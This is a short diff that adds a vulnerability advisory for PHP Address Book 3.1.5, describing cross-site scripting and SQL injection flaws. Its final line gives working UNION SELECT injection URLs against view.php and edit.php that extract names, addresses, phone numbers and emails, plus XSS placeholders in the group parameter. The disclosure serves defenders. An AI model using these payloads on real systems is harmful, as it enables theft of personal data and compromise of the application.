@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/29560/info
+
+PHP Address Book is prone to multiple cross-site scripting and SQL-injection vulnerabilities because the application fails to sufficiently sanitize user-supplied input.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+PHP-Address Book 3.1.5 is vulnerable; other versions may also be affected.
+
+http://www.example.com/view.php?id=-1 union select 1,2,3,id,firstname,lastname,7,address,mobile,10,11,12,email,14 from addressbook/* http://www.example.com/edit.php?id=-1 union select 1,2,3,id,firstname,lastname,7,address,mobile,10,11,12,email,14 from addressbook/* http://www.example.com/?group=<XSS> http://www.example.com/index.php?group=<XSS>
